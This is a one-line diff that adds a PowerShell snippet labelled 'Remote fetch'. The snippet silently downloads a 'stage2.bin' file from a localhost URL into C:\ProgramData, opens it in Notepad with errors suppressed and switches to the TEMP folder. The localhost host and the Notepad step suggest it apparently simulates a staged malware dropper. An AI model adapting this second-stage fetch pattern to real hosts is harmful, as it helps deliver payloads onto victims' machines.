@@ -1,0 +1,1 @@
+<# Remote fetch #> $Stage2Url = "http://localhost:9001/cdn/stage2.bin"; $Stage2Path = 'C:\ProgramData\stage2.bin'; curl.exe -s -L -o $Stage2Path $Stage2Url; Start-Process -FilePath "notepad.exe" -ArgumentList $Stage2Path -ErrorAction SilentlyContinue; Set-Location -Path $env:TEMP
